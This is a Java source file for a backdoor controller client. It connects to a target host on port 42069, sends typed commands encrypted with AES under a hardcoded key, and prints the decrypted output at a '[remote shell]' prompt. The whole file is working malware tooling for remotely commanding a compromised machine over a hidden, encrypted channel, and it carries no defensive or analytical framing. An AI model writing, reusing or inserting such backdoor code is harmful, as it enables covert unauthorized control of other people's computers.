package com.github.pulsebeat02;

import com.github.pulsebeat02.backdoor.CryptoHelper;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class BackDoorClient {

  public BackDoorClient() {}

  public void console(final String host) throws Exception {
    final int port = 42069;
    final String endSignal = "%**%";
    final String encryptionKey = "sixteen byte key";
    final String algorithm = "AES";
    final CryptoHelper cryptoHelper = new CryptoHelper(encryptionKey, algorithm);
    final Socket socket = new Socket(host, port);
    final Scanner scanner = new Scanner(System.in);
    final PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
    final BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
    while (!socket.isClosed()) {
      try {
        System.err.print("[remote shell] $ ");
        final String cmd = scanner.nextLine();
        printWriter.println(cryptoHelper.encrypt(cmd));
        printWriter.flush();
        if (cmd.equals("exit")) {
          break;
        }
        String line;
        while ((line = cryptoHelper.decrypt(br.readLine())) != null) {
          if (line.endsWith(endSignal)) {
            break;
          }
          System.out.println(line);
        }
      } catch (final Exception e) {
        e.printStackTrace();
        br.close();
        printWriter.close();
        socket.close();
      }
    }
  }

  public static void main(final String[] args) throws Exception {
    new BackDoorClient().console("127.0.0.1");
  }

}
